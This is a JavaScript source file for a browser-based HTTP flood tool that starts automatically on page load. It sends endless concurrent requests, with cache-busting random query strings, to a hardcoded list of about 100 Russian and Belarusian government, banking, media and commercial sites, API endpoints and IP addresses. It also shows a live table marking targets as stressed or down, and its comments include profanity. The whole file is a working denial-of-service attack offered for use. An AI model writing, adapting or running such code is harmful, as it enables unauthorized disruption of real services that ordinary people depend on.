// Start the attack when the onload event fires, so the DOM will be loaded and the
// dynamically-assembled table of target statuses can be generated.
window.onload = function () {
    var fuckYouRussianWarship = new FYRW();
}


/*
    StatusTable class uses the target list to generate a table.
    Constructor takes the id of an HTML DIV Element in order to grab it
    and populate it with status entries for each target (hardcoded at bottom
    of this file). Each status entry will show the target URL, the number of
    requests, and the number of errored responses. General "cannot be reached"
    errors are not added to this last count.
*/

// Pass the id of the parent container for the status table to the constructor.
class StatusTable {
    // For storing the parent div's HTMLElement object.
    parentDiv = undefined;
    // For storing the interval that will update the DOM periodically to show
    // stats to the user.
    updateIntervalID = undefined;
    // Object for storing target info. Objects it stores will be of the format:
    /*
        targetObj {
            errCount: 0,            // Total number of errored responses.
            reqCount: 0,            // Total number of requests sent.
            downCount: 0,           // Used to keep track of received 500-511 error codes.
            timeoutCount: 0,        // Determines if connection is timing out.
            isDown: false;          // Whether we've marked this particular site as down.
            statDiv: HTMLElement statusDiv,     // The container div for stats.
            reqCountDiv: HTMLElement reqDiv     // The div that holds the DOM-displayed request count.
        }
    */
    TARGET_STRESSED_THRESHOLD = 0.50;     // Percentage of 500 - 511 codes or timeouts we need to mark a server as 'down'.
    TARGET_TIMEOUT_THRESHOLD = 0.95;  // If # requests / # timeouts > % defined here.
    MIN_REQUESTS_BEFORE_MARKING = 50;   // Minimum number of requests before marking targets as down or stressed.
    targetInfoFields = {};

    constructor(parentDivID) {
        this.parentDiv = document.getElementById(parentDivID);

        // Create all the status elements for what we'll be tracking on each target.
        for (var t = 0; t < targets.length; t++) {
            this.newTarget(targets[t]);
        }

        // Set up the update interval for the DOM.
        this.updateIntervalID = setInterval(() => {
            targets.map(this.drawUpdate, this);
        }, 1000);       // Update every second more than this pointless bogs the page down.
    }

    // Helper function for generating the DOM display status of each target.
    // Doing this dynamically makes it easier to add targets during runtime. (TODO)
    // 'target' is URL string
    newTarget(target) {
        // We'll use the target URL as the key for storage object.
        //target = targets[t];

        // This is the element that will contain any metrics we want to display
        // to the user about this target.
        let statDiv = document.createElement("DIV");
        statDiv.classList.add("target-status__container");

        // URL div.
        let urlDiv = document.createElement("DIV");
        urlDiv.classList.add("target-url");
        urlDiv.innerText = target;

        // Request Count div.
        let reqDiv = document.createElement("DIV");
        reqDiv.classList.add("req-count");
        reqDiv.innerText = 0;

        let errDiv = document.createElement("DIV");
        errDiv.classList.add("err-count");
        errDiv.innerText = 0;

        let toDiv = document.createElement("DIV");
        toDiv.classList.add("to-count");
        toDiv.innerText = 0;

        // This obj contains any data we'll track for each target.
        let targetObj = {};
        targetObj["errCount"] = 0;
        targetObj["reqCount"] = 0;
        targetObj["timeoutCount"] = 0;
        targetObj["statDiv"] = statDiv;
        targetObj["errCountDiv"] = errDiv;
        targetObj["reqCountDiv"] = reqDiv;
        targetObj["toCountDiv"] = toDiv;
        targetObj["isDown"] = false;        // Whether we've marked this particular site as down.
        targetObj["isStressed"] = false;    // Whether we've marked this particular site as stressed.

        // Add the relevant info to the status container.
        statDiv.appendChild(urlDiv);
        statDiv.appendChild(reqDiv);
        statDiv.appendChild(errDiv);
        statDiv.appendChild(toDiv);

        // Now append it to the overall parent
        this.parentDiv.appendChild(statDiv);

        // Store the targetObj for later.
        this.targetInfoFields[target] = targetObj;
    }

    // Helper function for adding new targets during runtime.
    // This will need a sanity-checker implemented. (TODO)
    addTarget(target) {
        // Add sanity checking here later.
        this.newTarget(target);
    }

    // Increment the relevant target's error count.
    targetErrUpdate(target, status) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.errCount++;
        // console.log(`Error ${status} on ${target}`); // Debug line

        // If we have a 500 or 0 status code, check the count and see if
        // we should mark as down.
        if ((tarInfo.reqCount / tarInfo.errCount) > this.TARGET_STRESSED_THRESHOLD && tarInfo.isStressed === false && tarInfo.reqCount > this.MIN_REQUESTS_BEFORE_MARKING) {
            this.markAsStressed(target);
            return;
        }

        if (tarInfo.isStressed === true && (tarInfo.reqCount / tarInfo.errCount) < this.TARGET_STRESSED_THRESHOLD) {
            this.unmarkAsStressed(target);
            return;
        }
    }

    targetTimeoutUpdate(target, status) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.timeoutCount++;

        if ((tarInfo.reqCount / tarInfo.timeoutCount) > this.TARGET_TIMEOUT_THRESHOLD && tarInfo.isDown === false && tarInfo.reqCount > this.MIN_REQUESTS_BEFORE_MARKING) {
            this.markAsDown(target);
            return;
        }

        if (tarInfo.isDown === true && (tarInfo.reqCount / tarInfo.timeoutCount) < this.TARGET_TIMEOUT_THRESHOLD) {
            this.unmarkAsDown(target);
            return;
        }
    }
    
    // Increment the relevant target's request count.
    targetReqUpdate(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.reqCount++;
    }
    
    // This triggers an update to the DOM, it fires from the
    // interval set in the constructor.
    drawUpdate(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.reqCountDiv.innerText = tarInfo.reqCount;
        tarInfo.errCountDiv.innerText = tarInfo.errCount;
        tarInfo.toCountDiv.innerText = tarInfo.timeoutCount;
    }

    markAsDown(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.statDiv.classList.add("target-down");
        tarInfo.isDown = true;
        // Remove the stressed class so that the red will show.
        tarInfo.statDiv.classList.remove("target-stressed");
    }

    unmarkAsDown(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.statDiv.classList.remove("target-down");
        tarInfo.isDown = false;
    }

    markAsStressed(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.statDiv.classList.add("target-stressed");
        tarInfo.isStressed = true;
    }

    unmarkAsStressed(target) {
        let tarInfo = this.targetInfoFields[target];
        tarInfo.statDiv.classList.remove("target-stressed");
        tarInfo.isStressed = false;
    }
}

// The FYRW (Fuck You Russian Warship) class is what handles our flood attack.
// Takes no parameters. Just create a new instance and away we go.
class FYRW {
    // statTable var stores an instance of the StatTable class, so values can be incremented by this
    // instance of FYRW.
    statTable = undefined;
    CONCURRENCY_LIMIT = targets.length * 2;     // Any more than this and the rate of IP banning skyrockets.
    // This array holds all the Promises returned by fetch() operations.
    queue = [];
    attacking = true; // Should change to false later and add "USE A VPN" warning to top of page. (TODO)

    constructor() {
        this.statTable = new StatusTable("status-parent-div");

        // Start the attack.
        targets.map(this.flood, this);

        // this.flood(targets[0]);      // Debugging line.
    }

    // This should be tied to a button onclick event, once start/pause functionality is fully implemented. (TODO)
    attackToggle() {
        this.attacking = !this.attacking;
    }


    // Sets up and fires a fetch request.
    async fetchWithTimeout(resource, options) {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), options.timeout);
        return fetch(resource, {
            method: 'GET',
            mode: 'no-cors',
            signal: controller.signal
        }).then((response) => {
            clearTimeout(id);
            return response;
        }).catch((error) => {
            clearTimeout(id);
            throw error;
        })
    }

    async flood(target) {
        var counter = 0;
        while (this.attacking) {
            if (this.queue.length > this.CONCURRENCY_LIMIT) {
                await this.queue.shift();
            }

            // Every third request, bundle random garbage request to incease
            // strain on server computational load.
            var rand = counter % 3 === 0 ? '' : ('?' + Math.random() * 1000);
            this.queue.push(this.fetchWithTimeout(target + rand, {timeout: 2000}).catch((error) => {
                this.statTable.targetTimeoutUpdate(target, 27015);
            }).then((response) => {
                if (response && !response.ok) {
                    this.statTable.targetErrUpdate(target, response.status);
                }
                this.statTable.targetReqUpdate(target);
            }));
            // Protect against integer overflow issues. Not a JS dev, no idea if this is needed, but why not? (UNCERTAIN)
            counter = (counter === Number.MAX_VALUE) ? 0 : counter + 1;
        }
    }
}

// Our selection of hardcoded targets.
var targets = [
    'https://lenta.ru/',
    'https://ria.ru/',
    'https://ria.ru/lenta/',
    'https://www.rbc.ru/',
    'https://www.rt.com/',
    'http://kremlin.ru/',
    'http://en.kremlin.ru/',
    'https://smotrim.ru/',
    'https://tass.ru/',
    'https://tvzvezda.ru/',
    'https://vsoloviev.ru/',
    'https://www.1tv.ru/',
    'https://www.vesti.ru/',
    'https://online.sberbank.ru/',
    'https://sberbank.ru/',
    'https://zakupki.gov.ru/',
    'https://www.gosuslugi.ru/',
    'https://er.ru/',
    'https://www.rzd.ru/',
    'https://rzdlog.ru/',
    'https://vgtrk.ru/',
    'https://www.interfax.ru/',
    'https://www.mos.ru/uslugi/',
    'http://government.ru/',
    'https://mil.ru/',
    'https://www.nalog.gov.ru/',
    'https://customs.gov.ru/',
    'https://pfr.gov.ru/',
    'https://rkn.gov.ru/',
    'https://www.gazprombank.ru/',
    'https://www.vtb.ru/',
    'https://www.gazprom.ru/',
    'https://lukoil.ru',
    'https://magnit.ru/',
    'https://www.nornickel.com/',
    'https://www.surgutneftegas.ru/',
    'https://www.tatneft.ru/',
    'https://www.evraz.com/ru/',
    'https://nlmk.com/',
    'https://www.sibur.ru/',
    'https://www.severstal.com/',
    'https://www.metalloinvest.com/',
    'https://nangs.org/',
    'https://rmk-group.ru/ru/',
    'https://www.tmk-group.ru/',
    'https://yandex.ru/',
    'https://yandex.by/',
    'https://www.polymetalinternational.com/ru/',
    'https://www.uralkali.com/ru/',
    'https://www.eurosib.ru/',
    'https://omk.ru/',
    'https://mail.ru/',
    'https://ok.ru/',
    'https://avito.ru/',
    'https://kinopoisk.ru/',
    'https://mail.rkn.gov.ru/',
    'https://cloud.rkn.gov.ru/',
    'https://mvd.gov.ru/',
    'https://pwd.wto.economy.gov.ru/',
    'https://stroi.gov.ru/',
    'https://proverki.gov.ru/',
    'https://www.gazeta.ru/',
    'https://www.crimea.kp.ru/',
    'https://www.kommersant.ru/',
    'https://riafan.ru/',
    'https://www.mk.ru/',
    'https://api.sberbank.ru/prod/tokens/v2/oauth',
    'https://api.sberbank.ru/prod/tokens/v2/oidc',
    'https://www.vedomosti.ru/',
    'https://sputnik.by/',
    'https://wikimapia.org/#lang=en&lat=50.584800&lon=30.489800&z=12&m=w&tag=516',
    'https://ozon.ru/',
    'https://rambler.ru/',
    'https://gdz.ru/',
    'https://music.yandex.ru/',
    'https://hh.ru/',
    'https://russia-insider.com/',
    'https://rsl.ru/',
    'https://tass.ru/',
    'https://vz.ru/',
    'https://pikabu.ru/',
    'https://bezformata.com/',
    'https://mango.org/',
    'https://ya.ru/',
    'https://business.rk.gov.ru/',
    'https://tvr.by/',
    'https://belmarket.by/',
    'https://belarus.by/',
    'https://belnovosti.by/',
    'https://fsb.ru/',
    'https://ukraina.ru/',
    'https://mid.ru/',
    'https://iz.ru/',
    'https://pravda.sk/',
    'https://vestiprim.com/',
    'https://meduza.io/feature/2022/03/03/kogda-ty-vstupish-v-sovsem-uzh-vzrosluyu-zhizn-vse-uzhe-ulyazhetsya',
    'https://185.170.2.232/',
    'https://185.170.2.231/'
]